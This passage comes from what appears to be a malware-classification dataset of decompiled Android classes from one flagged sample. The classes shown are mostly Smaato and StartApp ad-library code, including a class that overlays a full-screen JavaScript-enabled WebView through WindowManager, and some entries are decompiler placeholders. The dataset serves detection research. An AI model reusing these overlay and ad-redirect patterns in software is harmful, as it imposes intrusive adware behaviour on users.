e;     } catch (    Exception e2) {       throw new CloseButtonViewInitFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.toaster\GetBitMap.code","class GetBitMap extends AsyncTask<String,Void,Bitmap> {   GetBitMap(){   }   @Override public Bitmap doInBackground(  final String... strArr){     return new CrashReportTemplate<Bitmap>(){       @Override public Bitmap b() throws Exception {         return BitmapFactory.decodeStream(new URL(strArr[0]).openConnection().getInputStream());       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.toaster\ToasterLayout.code","public class ToasterLayout extends BaseView {   ToasterBanner j;   public ToasterLayout(  Context context,  ToasterBanner toasterBanner){     super(context);     this.j=toasterBanner;   }   @Override public Handler getBannerAnimatorHandler(){     if (this.g == null) {       setBannerAnimatorHandler(new BannerHandler(this,this,null));     }     return this.g;   }   @Override public boolean e() throws BannerViewSwitchingViewsException {     boolean e=super.e();     this.j.a();     return e;   } public class BannerHandler extends Handler {     private WeakReference<BaseView> b;     private BaseView c;     private BannerHandler(    BaseView baseView){       this.b=null;       this.c=baseView;     }     BannerHandler(    ToasterLayout toasterLayout,    BaseView baseView,    BannerHandler bannerHandler){       this(baseView);     }     protected WeakReference<BaseView> a(){       if (this.b == null) {         this.b=new WeakReference<>(this.c);       }       return this.b;     }     @Override public void handleMessage(    final Message message){       Debugger.a(new Object(){       } );       super.handleMessage(message);       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           BaseView baseView=BannerHandler.this.a().get();           if (baseView != null) {             if (message.what == 101) {               baseView.getBannerState().b();               BannerAnimator.a().a(message.arg1,message.arg2,ToasterLayout.this.getCurrentPackage(),baseView,ToasterLayout.this.h);               ToasterLayout.this.j.d();             }  else {               baseView.getBannerState().d();             }           }           return null;         }       } .c();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister\AnonymousClass1.code","public class AnonymousClass1 extends CrashReportTemplate<Void> {   AnonymousClass1(){   }   @Override public Void b() throws Exception {     Iterator it=BannerTwister.this.b.iterator();     while (it.hasNext()) {       BannerView bannerView=(BannerView)it.next();       bannerView.a(new AdListenerInterface(){         @Override public void a(        AdDownloaderInterface adDownloaderInterface,        final ReceivedBannerInterface receivedBannerInterface) throws AdReceiveFailed {           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (receivedBannerInterface.i() == ErrorCode.NO_ERROR) {                 BannerTwister.this.b();                 return null;               }               BannerTwister.this.c();               return null;             }           } .c();         }       } );       bannerView.setBannerStateListener(new BannerStateListener(){         @Override public void a(        BaseView baseView){           BannerTwister.this.stopFlipping();         }         @Override public void b(        BaseView baseView) throws ClosingLandingPageFailed {           BannerTwister.this.startFlipping();         }       } );       bannerView.b();     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister\AnonymousClass10.code","class AnonymousClass10 extends CrashReportTemplate<Boolean> {   final BannerTwister a;   @Override public Boolean b() throws Exception {     Iterator it=this.a.b.iterator();     if (it.hasNext()) {       return Boolean.valueOf(((BannerView)it.next()).c());     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister\AnonymousClass3.code","class AnonymousClass3 extends CrashReportTemplate<Void> {   final BannerTwister a;   @Override public Void b() throws Exception {     ((Activity)this.a.getContext()).runOnUiThread(new RequestBanner(this.a,null));     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister\AnonymousClass5.code","class AnonymousClass5 extends CrashReportTemplate<Boolean> {   final BannerTwister a;   @Override public Boolean b() throws Exception {     Iterator it=this.a.b.iterator();     if (it.hasNext()) {       return Boolean.valueOf(((BannerView)it.next()).h());     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister\BannerTwister.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1e5107b4"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister\RequestBanner.code","public class RequestBanner implements Runnable {   private RequestBanner(){   }   RequestBanner(  BannerTwister bannerTwister,  RequestBanner requestBanner){     this();   } public class AnonymousClass1 extends CrashReportTemplate<Void> {     AnonymousClass1(){     }     @Override public Void b() throws Exception {       Iterator it=BannerTwister.this.b.iterator();       while (it.hasNext()) {         BannerView bannerView=(BannerView)it.next();         bannerView.a(new AdListenerInterface(){           @Override public void a(          AdDownloaderInterface adDownloaderInterface,          final ReceivedBannerInterface receivedBannerInterface) throws AdReceiveFailed {             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (receivedBannerInterface.i() == ErrorCode.NO_ERROR) {                   BannerTwister.this.b();                   return null;                 }                 BannerTwister.this.c();                 return null;               }             } .c();           }         } );         bannerView.setBannerStateListener(new BannerStateListener(){           @Override public void a(          BaseView baseView){             BannerTwister.this.stopFlipping();           }           @Override public void b(          BaseView baseView) throws ClosingLandingPageFailed {             BannerTwister.this.startFlipping();           }         } );         bannerView.b();       }       return null;     }   }   @Override public void run(){     new AnonymousClass1().c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.exception\NotAbleToDetectBannerLoaded.code","public class NotAbleToDetectBannerLoaded extends Exception {   public NotAbleToDetectBannerLoaded(){   }   public NotAbleToDetectBannerLoaded(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.exception\NotAbleToDetectBannerNotLoaded.code","public class NotAbleToDetectBannerNotLoaded extends Exception {   public NotAbleToDetectBannerNotLoaded(){   }   public NotAbleToDetectBannerNotLoaded(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.external\Rotate3dXAxisAnimation.code","public class Rotate3dXAxisAnimation extends Animation {   private final float a;   private final float b;   private final float c;   private final float d;   private final float e;   private final boolean f;   private Camera g;   public Rotate3dXAxisAnimation(  float f,  float f2,  float f3,  float f4,  float f5,  boolean z){     this.a=f;     this.b=f2;     this.c=f3;     this.d=f4;     this.e=f5;     this.f=z;     setFillEnabled(false);   }   @Override public void initialize(  int i,  int i2,  int i3,  int i4){     super.initialize(i,i2,i3,i4);     this.g=new Camera();   }   @Override protected void applyTransformation(  float f,  Transformation transformation){     float f2=this.a;     float f3=f2 + ((this.b - f2) * f);     float f4=this.c;     float f5=this.d;     Camera camera=this.g;     Matrix matrix=transformation.getMatrix();     camera.save();     if (this.f) {       camera.translate(0.0f,0.0f,this.e * f);     }  else {       camera.translate(0.0f,0.0f,this.e * (1.0f - f));     }     camera.rotateX(f3);     camera.getMatrix(matrix);     camera.restore();     matrix.preTranslate(-f4,-f5);     matrix.postTranslate(f4,f5);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.external\Rotate3dYAxisAnimation.code","public class Rotate3dYAxisAnimation extends Animation {   private final float a;   private final float b;   private final float c;   private final float d;   private final float e;   private final boolean f;   private Camera g;   public Rotate3dYAxisAnimation(  float f,  float f2,  float f3,  float f4,  float f5,  boolean z){     this.a=f;     this.b=f2;     this.c=f3;     this.d=f4;     this.e=f5;     this.f=z;   }   @Override public void initialize(  int i,  int i2,  int i3,  int i4){     super.initialize(i,i2,i3,i4);     this.g=new Camera();   }   @Override protected void applyTransformation(  float f,  Transformation transformation){     float f2=this.a;     float f3=f2 + ((this.b - f2) * f);     float f4=this.c;     float f5=this.d;     Camera camera=this.g;     Matrix matrix=transformation.getMatrix();     camera.save();     if (this.f) {       camera.translate(0.0f,0.0f,this.e * f);     }  else {       camera.translate(0.0f,0.0f,this.e * (1.0f - f));     }     camera.rotateY(f3);     camera.getMatrix(matrix);     camera.restore();     matrix.preTranslate(-f4,-f5);     matrix.postTranslate(f4,f5);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.interfaces\AdListener.code","public interface AdListener {   void a(  int i);   void b(  int i); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.interfaces\BannerTwisterInterface.code","public interface BannerTwisterInterface { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\AnimationFade.code","public class AnimationFade extends AnimationProvider {   public AnimationFade(  int i){     super(i);   }   @Override public Animation a(){     AlphaAnimation alphaAnimation=new AlphaAnimation(0.0f,1.0f);     alphaAnimation.setInterpolator(new DecelerateInterpolator());     alphaAnimation.setDuration(this.a);     return alphaAnimation;   }   @Override public Animation b(){     AlphaAnimation alphaAnimation=new AlphaAnimation(1.0f,0.0f);     alphaAnimation.setInterpolator(new AccelerateInterpolator());     alphaAnimation.setStartOffset(this.a + 100);     alphaAnimation.setDuration(this.a);     return alphaAnimation;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\AnimationProvider.code","public abstract class AnimationProvider {   protected int a;   public abstract Animation a();   public abstract Animation b();   public AnimationProvider(  int i){     this.a=i;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\AnimationRotate.code","public class AnimationRotate extends AnimationProvider {   public AnimationRotate(  int i){     super(i);   }   @Override public Animation a(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         RotateAnimation rotateAnimation=new RotateAnimation(-180.0f,0.0f,DeviceDataCollector.a().i() / 2,0.0f);         rotateAnimation.setDuration(1000L);         return rotateAnimation;       }     } .c();   }   @Override public Animation b(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         RotateAnimation rotateAnimation=new RotateAnimation(0.0f,180.0f,DeviceDataCollector.a().i() / 2,0.0f);         rotateAnimation.setDuration(1000L);         return rotateAnimation;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\AnimationRotate3DXAxis.code","public class AnimationRotate3DXAxis extends AnimationProvider {   public AnimationRotate3DXAxis(  int i){     super(i);   }   @Override public Animation a(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         Rotate3dXAxisAnimation rotate3dXAxisAnimation=new Rotate3dXAxisAnimation(180.0f,0.0f,0.0f,35.0f,0.0f,false);         rotate3dXAxisAnimation.setDuration(1000L);         rotate3dXAxisAnimation.setFillEnabled(false);         return rotate3dXAxisAnimation;       }     } .c();   }   @Override public Animation b(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         Rotate3dXAxisAnimation rotate3dXAxisAnimation=new Rotate3dXAxisAnimation(0.0f,180.0f,0.0f,35.0f,0.0f,false);         rotate3dXAxisAnimation.setDuration(1000L);         rotate3dXAxisAnimation.setFillEnabled(false);         return rotate3dXAxisAnimation;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\AnimationRotate3DYAxis.code","public class AnimationRotate3DYAxis extends AnimationProvider {   public AnimationRotate3DYAxis(  int i){     super(i);   }   @Override public Animation a(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         Rotate3dYAxisAnimation rotate3dYAxisAnimation=new Rotate3dYAxisAnimation(90.0f,0.0f,DeviceDataCollector.a().i() / 2,90.0f,180.0f,false);         rotate3dYAxisAnimation.reset();         rotate3dYAxisAnimation.setDuration(1000L);         rotate3dYAxisAnimation.setFillAfter(true);         rotate3dYAxisAnimation.setInterpolator(new AccelerateInterpolator());         return rotate3dYAxisAnimation;       }     } .c();   }   @Override public Animation b(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         Rotate3dYAxisAnimation rotate3dYAxisAnimation=new Rotate3dYAxisAnimation(0.0f,90.0f,DeviceDataCollector.a().i() / 2,90.0f,180.0f,true);         rotate3dYAxisAnimation.reset();         rotate3dYAxisAnimation.setDuration(1000L);         rotate3dYAxisAnimation.setFillAfter(true);         rotate3dYAxisAnimation.setInterpolator(new AccelerateInterpolator());         return rotate3dYAxisAnimation;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\AnimationTranslate.code","public class AnimationTranslate extends AnimationProvider {   public AnimationTranslate(  int i){     super(i);   }   @Override public Animation a(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         TranslateAnimation translateAnimation=new TranslateAnimation(-DeviceDataCollector.a().i(),0.0f,0.0f,0.0f);         translateAnimation.setDuration(AnimationTranslate.this.a);         return translateAnimation;       }     } .c();   }   @Override public Animation b(){     return new CrashReportTemplate<Animation>(){       @Override public Animation b() throws Exception {         TranslateAnimation translateAnimation=new TranslateAnimation(0.0f,DeviceDataCollector.a().i(),0.0f,0.0f);         translateAnimation.setDuration(AnimationTranslate.this.a);         return translateAnimation;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.twister.utilities\Constant.code","public class Constant {   public static final int ANIMATION_DURATION=1000;   private static final int ANIMATION_DURATION_IN_SECONDS=1;   public static final int MAX_BANNERS_NUMBER=2;   private static final int MILLISECOND=1000;   public static final int MIN_FLIP_INTERVAL=5000;   private Constant(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\a.code","public class a {   private String a;   private String b;   private boolean c=true;   private boolean d=false;   private int e;   private int f;   public a(  String str,  String str2,  int i,  int i2){     this.e=0;     this.f=0;     this.a=str;     this.b=str2;     this.e=i;     this.f=i2;   }   public String a(){     return this.a;   }   public void a(  String str){     this.a=str;   }   public void a(  boolean z){     this.c=z;   }   public String b(){     return this.b;   }   public void b(  boolean z){     this.d=z;   }   public boolean c(){     return this.c;   }   public boolean d(){     return this.d;   }   public int e(){     return this.f;   } } private class a extends WebViewClient {   private a(){   }   @Override public void onPageFinished(  WebView webView,  String str){     i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");     super.onPageFinished(webView,str);   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");     super.onPageStarted(webView,str,bitmap);   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     super.onReceivedError(webView,i,str,str2);     AppWallDelegateActivity.this.finish();   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");     String lowerCase=str.toLowerCase();     if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com"")) && AppWallDelegateActivity.this.a) {       return false;     }     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));     intent.addFlags(76021760);     AppWallDelegateActivity.this.startActivity(intent);     if (webView != null) {       webView.destroy();     }     AppWallDelegateActivity.this.finish();     return true;   } } public static class a extends BroadcastReceiver {   private c a;   public void a(  c cVar){     this.a=cVar;   }   @Override public void onReceive(  Context context,  Intent intent){     i.a(2,""DismissButtonBroadcastReceiver::onReceive - action = ["" + intent.getAction() + ""]"");     if (this.a != null) {       this.a.a();     }   } } private class a implements AdEventListener {   private AdEventListener c;   private boolean b=false;   private boolean d=false;   public a(  AdEventListener adEventListener){     this.c=null;     this.c=adEventListener;   }   @Override public void onFailedToReceiveAd(  Ad ad){     if (!this.d) {       this.c.onFailedToReceiveAd(StartAppAd.this);     }     this.d=true;   }   @Override public void onReceiveAd(  Ad ad){     if (this.b) {       return;     }     this.b=true;     this.c.onReceiveAd(StartAppAd.this);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\Ad.code","public abstract class Ad {   private static boolean init=false;   protected Context context;   protected Object extraData=null;   AdInformationOverrides adInfoOverride=AdInformationOverrides.a();   protected AdPreferences.Placement placement=AdPreferences.Placement.INAPP_FULL_SCREEN;   protected String errorMessage=null;   private AdState state=AdState.UN_INITIALIZED;   public enum AdState {  UN_INITIALIZED,   PROCESSING,   READY}   public Ad(  Context context){     this.context=context;   }   @Deprecated public boolean doHome(){     return false;   }   public AdInformationOverrides getAdInfoOverride(){     return this.adInfoOverride;   }   public Context getContext(){     return this.context;   }   public String getErrorMessage(){     return this.errorMessage;   }   public Object getExtraData(){     return this.extraData;   }   public AdState getState(){     return this.state;   }   public boolean isReady(){     return this.state == AdState.READY;   }   @Deprecated public boolean load(){     return load(new AdPreferences(),null);   }   @Deprecated public boolean load(  AdEventListener adEventListener){     return load(new AdPreferences(),adEventListener);   }   @Deprecated public boolean load(  AdPreferences adPreferences){     return load(adPreferences,null);   }   @Deprecated public boolean load(  AdPreferences adPreferences,  AdEventListener adEventListener){     return load(adPreferences,adEventListener,true);   }   public boolean load(  final AdPreferences adPreferences,  final AdEventListener adEventListener,  boolean z){     boolean z2;     g.b(this.context,""User-Agent"",new WebView(this.context).getSettings().getUserAgentString());     if (!init) {       p.b(this.context);       j.a(this.context);       MetaData.INSTANCE.setDefaults(this.context);       init=true;     }     p.a(this.context,adPreferences);     String str="""";     if (adPreferences.getPublisherId() == null || """".equals(adPreferences.getPublisherId()) || adPreferences.getProductId() == null || """".equals(adPreferences.getProductId())) {       str=""publisher ID and/or product ID were not set."";       z2=true;     }  else {       z2=false;     }     if (this.state != AdState.UN_INITIALIZED) {       str=""load() was already called."";       z2=true;     }     if (!p.a(this.context)) {       str=""network not available."";       z2=true;     }     if (z2) {       setErrorMessage(""Ad wasn't loaded: "" + str);       if (adEventListener != null) {         new Handler().post(new Runnable(){           @Override public void run(){             adEventListener.onFailedToReceiveAd(Ad.this);           }         } );       }       return false;     }     setState(AdState.PROCESSING);     if (MetaData.INSTANCE.isInit() || !z) {       loadAds(adPreferences,adEventListener);       return true;     }     new h(this.context,adPreferences,new o(){       @Override public void onFinishLoadingMeta(){         Ad.this.loadAds(adPreferences,adEventListener);       }     } ).execute((Void)null);     return true;   }   protected abstract void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener);   public void setAdInfoOverride(  AdInformationOverrides adInformationOverrides){     this.adInfoOverride=adInformationOverrides;   }   public void setErrorMessage(  String str){     this.errorMessage=str;   }   public void setExtraData(  Object obj){     this.extraData=obj;   }   public void setState(  AdState adState){     this.state=adState;   }   @Deprecated public boolean show(){     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\AdDisplayListener.code","public interface AdDisplayListener {   void adDisplayed(  Ad ad);   void adHidden(  Ad ad); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\AdEventListener.code","public interface AdEventListener {   void onFailedToReceiveAd(  Ad ad);   void onReceiveAd(  Ad ad); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\AnonymousClass3.code","public class AnonymousClass3 implements Runnable {   AnonymousClass3(){   }   @Override public void run(){     c.this.i.post(new Runnable(){       @Override public void run(){         c.this.i.postDelayed(new Runnable(){           @Override public void run(){             c.this.a(1000);           }         } ,c.this.e());       }     } );   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\AppWallActivity.code","public class AppWallActivity extends Activity {   private com.startapp.android.publish.b.b a;   private void a(){     this.a=com.startapp.android.publish.b.b.a(this,getIntent(),AdPreferences.Placement.getByIndex(getIntent().getIntExtra(""placement"",0)));   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     i.a(2,""AppWallActivity::onCreate"");     a();     this.a.a(bundle);   }   @Override protected void onDestroy(){     i.a(2,""AppWallActivity::onDestroy"");     this.a.l();     super.onDestroy();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (this.a.a(i,keyEvent)) {       return true;     }     return super.onKeyDown(i,keyEvent);   }   @Override protected void onPause(){     i.a(2,""AppWallActivity::onPause"");     super.onPause();     this.a.j();     p.c();   }   @Override protected void onResume(){     i.a(2,""AppWallActivity::onResume"");     super.onResume();     this.a.k();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\AppWallDelegateActivity.code","public class AppWallDelegateActivity extends Activity {   private boolean a; private class a extends WebViewClient {     private a(){     }     @Override public void onPageFinished(    WebView webView,    String str){       i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");       super.onPageFinished(webView,str);     }     @Override public void onPageStarted(    WebView webView,    String str,    Bitmap bitmap){       i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");       super.onPageStarted(webView,str,bitmap);     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       super.onReceivedError(webView,i,str,str2);       AppWallDelegateActivity.this.finish();     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");       String lowerCase=str.toLowerCase();       if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com"")) && AppWallDelegateActivity.this.a) {         return false;       }       Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));       intent.addFlags(76021760);       AppWallDelegateActivity.this.startActivity(intent);       if (webView != null) {         webView.destroy();       }       AppWallDelegateActivity.this.finish();       return true;     }   }   @Override public void onConfigurationChanged(  Configuration configuration){     i.a(2,""AppWallActivity::onConfigurationChanged orientation - ["" + configuration.orientation + ""]"");     super.onConfigurationChanged(configuration);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     Intent intent=getIntent();     this.a=intent.getBooleanExtra(""smartRedirect"",true);     String stringExtra=intent.getStringExtra(""clickUrl"");     WebView webView=new WebView(getApplicationContext());     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebChromeClient(new WebChromeClient());     webView.setWebViewClient(new a());     webView.loadUrl(stringExtra);   }   @Override protected void onDestroy(){     i.a(2,""AppWallActivity::onDestroy"");     super.onDestroy();   }   @Override protected void onPause(){     i.a(2,""AppWallActivity::onPause"");     super.onPause();   }   @Override protected void onRestart(){     i.a(2,""AppWallActivity::onRestart"");     super.onRestart();   }   @Override protected void onResume(){     i.a(2,""AppWallActivity::onResume"");     super.onResume();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@a1a9217public class b extends WebViewClient {   private b(){   }   @Override public void onPageFinished(  WebView webView,  String str){     i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");     super.onPageFinished(webView,str);     webView.setBackgroundColor(0);     webView.loadUrl(""javascript:gClientInterface.setMode('home')"");   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");     super.onPageStarted(webView,str,bitmap);   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     i.a(2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");     if (c.this.g.getVisibility() == 0) {       c.this.g.setVisibility(8);     }     super.onReceivedError(webView,i,str,str2);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     int parseInt;     c.this.d();     if (str.contains(""index="")) {       try {         parseInt=Integer.parseInt(str.split(""&"")[r0.length - 1].split(""="")[1]);       }  catch (      Exception e) {         i.a(6,""Error while trying parsing index from url"");         return false;       }     }  else {       parseInt=0;     }     if (c.this.g.getVisibility() != 0) {       c.this.g.setVisibility(0);     }     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");     String lowerCase=str.toLowerCase();     if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com"")) && c.this.f[parseInt]) {       return false;     }     long e2=c.this.e();     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - delay=["" + e2 + ""]"");     p.b(c.this.getContext(),str);     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading:run - time of activity =["" + System.currentTimeMillis() + ""]"");     c.this.i.postDelayed(new Runnable(){       @Override public void run(){         c.this.a(1000);       }     } ,e2);     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\c.code","public class c extends FrameLayout {   protected int b;   protected WindowManager c;   private String[] e;   private boolean[] f;   private View g;   private long h;   private Handler i;   private String j;   private c.a k;   private AdInformationOverrides l;   private AdPreferences.Placement m;   private static a d=new a();   public static boolean a=false; public class AnonymousClass3 implements Runnable {     AnonymousClass3(){     }     @Override public void run(){       c.this.i.post(new Runnable(){         @Override public void run(){           c.this.i.postDelayed(new Runnable(){             @Override public void run(){               c.this.a(1000);             }           } ,c.this.e());         }       } );     }   } public static class a extends BroadcastReceiver {     private c a;     public void a(    c cVar){       this.a=cVar;     }     @Override public void onReceive(    Context context,    Intent intent){       i.a(2,""DismissButtonBroadcastReceiver::onReceive - action = ["" + intent.getAction() + ""]"");       if (this.a != null) {         this.a.a();       }     }   } public class b extends WebViewClient {     private b(){     }     @Override public void onPageFinished(    WebView webView,    String str){       i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");       super.onPageFinished(webView,str);       webView.setBackgroundColor(0);       webView.loadUrl(""javascript:gClientInterface.setMode('home')"");     }     @Override public void onPageStarted(    WebView webView,    String str,    Bitmap bitmap){       i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");       super.onPageStarted(webView,str,bitmap);     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       i.a(2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");       if (c.this.g.getVisibility() == 0) {         c.this.g.setVisibility(8);       }       super.onReceivedError(webView,i,str,str2);     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       int parseInt;       c.this.d();       if (str.contains(""index="")) {         try {           parseInt=Integer.parseInt(str.split(""&"")[r0.length - 1].split(""="")[1]);         }  catch (        Exception e) {           i.a(6,""Error while trying parsing index from url"");           return false;         }       }  else {         parseInt=0;       }       if (c.this.g.getVisibility() != 0) {         c.this.g.setVisibility(0);       }       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");       String lowerCase=str.toLowerCase();       if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com"")) && c.this.f[parseInt]) {         return false;       }       long e2=c.this.e();       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - delay=["" + e2 + ""]"");       p.b(c.this.getContext(),str);       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading:run - time of activity =["" + System.currentTimeMillis() + ""]"");       c.this.i.postDelayed(new Runnable(){         @Override public void run(){           c.this.a(1000);         }       } ,e2);       return true;     }   }   public c(  Context context){     super(context);     this.b=-1;     this.e=null;     this.f=new boolean[]{true};     this.g=null;     this.h=System.currentTimeMillis();     this.i=new Handler();     this.j="""";     this.l=AdInformationOverrides.a();     this.m=AdPreferences.Placement.INAPP_FULL_SCREEN;     d.a(this);     this.c=(WindowManager)getContext().getSystemService(""window"");     this.c.addView(this,getWmParams());   }   private void c(){     this.h=System.currentTimeMillis();     removeAllViews();     RelativeLayout relativeLayout=new RelativeLayout(getContext());     WebView webView=new WebView(getContext());     webView.setBackgroundColor(-16777216);     webView.setWebChromeClient(new WebChromeClient());     webView.setWebViewClient(new b());     webView.addJavascriptInterface(new JsInterface(getContext(),new Runnable(){       @Override public void run(){         c.this.i.post(new Runnable(){           @Override public void run(){             c.this.a();           }         } );       }     } ,new AnonymousClass3()),""startappwall"");     webView.getSettings().setJavaScriptEnabled(true);     webView.setVerticalScrollBarEnabled(false);     webView.setHorizontalScrollBarEnabled(false);     p.a(webView,this.j);     webView.setOnKeyListener(new View.OnKeyListener(){       @Override public boolean onKey(      View view,      int i,      KeyEvent keyEvent){         c.this.a();         return true;       }     } );     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);     webView.setFocusable(true);     webView.setFocusableInTouchMode(true);     webView.setLayoutParams(layoutParams);     relativeLayout.addView(webView);     